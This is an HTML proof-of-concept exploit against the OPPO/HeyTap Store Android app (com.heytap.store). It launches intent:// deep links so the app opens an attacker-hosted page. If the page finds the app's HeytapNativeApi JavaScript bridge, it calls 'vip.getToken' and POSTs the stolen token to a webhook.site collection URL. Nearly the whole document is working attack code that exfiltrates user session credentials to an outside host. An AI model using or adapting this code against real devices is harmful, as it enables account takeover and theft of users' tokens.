<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPPO Store Exploit Test</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
        .btn { width: 100%; max-width: 320px; padding: 18px; margin: 12px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 10px; cursor: pointer; }
        .scheme1 { background-color: #008f39; } /* oppomarket:// */
        .scheme2 { background-color: #007bff; } /* heytap:// */
        .scheme3 { background-color: #6f42c1; } /* store:// */
        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 11px; margin-top: 20px; border: 1px solid #ccc; max-height: 200px; overflow-y: auto; }
    </style>
</head>
<body>

    <h2>OPPO Store Deep Link Test</h2>
    <p>Targeting: <b>com.heytap.store</b></p>

    <button class="btn scheme1" onclick="launch('oppomarket')">Scheme: oppomarket://</button>
    <button class="btn scheme2" onclick="launch('heytap')">Scheme: heytap://</button>
    <button class="btn scheme3" onclick="launch('store')">Scheme: store://</button>

    <div id="log">Status Log:<br></div>

    <script>
        const targetUrl = "https://pk009900.github.io/my-oppo-test/";
        const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
        const pkg = "com.heytap.store";

        function log(msg) {
            document.getElementById("log").innerHTML += "> " + msg + "<br>";
        }

        function launch(scheme) {
            log("Trying scheme: " + scheme + " for " + pkg);
            
            // Standard Intent format with fallback
            const intent = `intent://credits?url=${targetUrl}#Intent;scheme=${scheme};package=${pkg};S.browser_fallback_url=${targetUrl};end`;
            
            window.location.href = intent;
        }

        // Bridge Logic: Only runs if the page is successfully loaded INSIDE the app
        window.onload = function() {
            if (window.HeytapNativeApi) {
                log("<b>SUCCESS: BRIDGE DETECTED!</b>");
                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
                    log("Token captured! Sending to Webhook...");
                    fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                });
            } else {
                log("Ready. Click a button to launch.");
            }
        };
    </script>
</body>
</html>
